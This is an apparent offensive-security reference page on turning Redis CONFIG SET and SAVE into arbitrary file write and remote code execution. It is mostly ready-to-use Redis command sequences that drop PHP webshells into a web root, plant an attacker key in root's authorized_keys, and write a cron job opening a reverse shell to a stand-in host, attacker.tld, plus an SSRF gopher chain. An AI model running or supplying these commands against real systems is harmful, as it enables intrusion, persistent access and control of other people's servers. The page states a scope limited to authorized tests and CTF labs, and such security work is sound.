---
title: "CONFIG SET abuse: writing files to disk for RCE"
description: "Relocating the Redis dump file with CONFIG SET dir and dbfilename, then SAVE, writes a controlled payload to disk: webshell, authorized_keys, or a cron job."
keywords:
  - CONFIG SET
  - Redis RCE
  - dbfilename dir
  - webshell write
  - authorized_keys
  - cron job injection
---

# CONFIG SET abuse

Redis persists its dataset to an RDB file whose directory and filename are runtime-configurable. An attacker who can issue commands (directly, or smuggled over RESP, see [Command injection](command.md)) can point that file at any location the Redis process can write, stuff a key with a chosen payload, and trigger a dump. The result is arbitrary file write, which converts to code execution through several well-worn targets.

> **Scope.** For authorized penetration tests, CTF labs, and assessment of systems you own or are contracted to test.

## The core chain

Four steps: relocate the dump directory, name the dump file, store the payload as a key, and flush to disk.

```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "\n\n<?php system($_GET['c']); ?>\n\n"
SAVE
```

`CONFIG SET dir` sets the working directory; `CONFIG SET dbfilename` sets the output filename; `SET` places the payload in a key; `SAVE` (synchronous) or `BGSAVE` (background) writes the RDB file to `dir/dbfilename`. The RDB format wraps the payload in binary header and footer bytes, but those bytes are inert for a PHP interpreter, an SSH key reader, or cron, so the embedded content still executes. Leading and trailing newlines around the payload keep it on its own lines, away from the binary framing.

Confirm the writable directory first with `CONFIG GET dir`, and read the current filename with `CONFIG GET dbfilename` so it can be restored to avoid disrupting the target.

## Target 1: webshell

When Redis shares a host with a web server and the document root is writable by the Redis user, the chain above drops an executable script into the web root:

```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename x.php
SET sh "\n<?php echo shell_exec($_REQUEST['cmd']); ?>\n"
BGSAVE
```

Then request `http://target.tld/x.php?cmd=id`.

## Target 2: SSH authorized_keys

Where Redis runs as a user with a home directory, write an attacker public key into `~/.ssh/authorized_keys`:

```
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET k "\n\nssh-rsa AAAAB3NzaC1yc2E... attacker@host\n\n"
SAVE
```

SSH ignores the surrounding RDB bytes as malformed lines and accepts the valid `ssh-rsa` line, granting key-based login as that user.

## Target 3: cron job

On systems whose cron reads drop-in files, write a crontab that spawns a reverse shell:

```
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SET job "\n\n* * * * * root bash -i >& /dev/tcp/attacker.tld/4444 0>&1\n\n"
SAVE
```

Path and format vary by distribution: `/var/spool/cron/crontabs/<user>` on Debian-family systems, `/var/spool/cron/<user>` on Red Hat-family systems, and `/etc/cron.d/<name>` for system drop-ins (which require a user field in the line, as shown). cron tolerates the malformed binary lines and runs the valid schedule line.

## Full smuggled sequence

Chained through an SSRF `gopher://` payload, each command separated by `\r\n`:

```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "\n<?php system($_GET['c']);?>\n"
SAVE
```

## References

- [Redis: CONFIG SET](https://redis.io/docs/latest/commands/config-set/)
- [Redis: persistence and RDB](https://redis.io/docs/latest/operate/oss_and_stack/management/persistence/)
- [PayloadsAllTheThings: Redis RCE via file write](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
